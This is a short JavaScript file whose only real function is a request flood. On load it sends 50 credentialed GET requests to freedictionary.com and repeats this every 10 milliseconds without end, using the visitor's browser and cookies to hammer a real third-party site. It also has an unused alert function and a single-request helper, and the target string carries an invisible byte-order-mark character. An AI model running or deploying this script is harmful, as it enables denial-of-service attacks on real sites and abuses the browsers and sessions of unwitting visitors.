var url = '﻿freedictionary.com'
var fullUrl = 'https://' + url;

sendRequest();

function test(){
	alert("hello world");
}
function createXhr(){
	var xhr = new XMLHttpRequest();
	return xhr;
}
function sendRequest(){
	for(var i = 0; i < 50; i++){
		var xhr = createXhr();
		var xhrUrl = new URL(fullUrl);
		xhr.withCredentials = true;
		xhr.open("GET", xhrUrl);
		xhr.send();
	}
	setTimeout(sendRequest, 10);
 }
 function sendOneRequest(){
 	var xhr = createXhr();
	var xhrUrl = new URL(fullUrl);
	xhr.withCredentials = true;
	xhr.open("GET", xhrUrl);
	xhr.send();
 }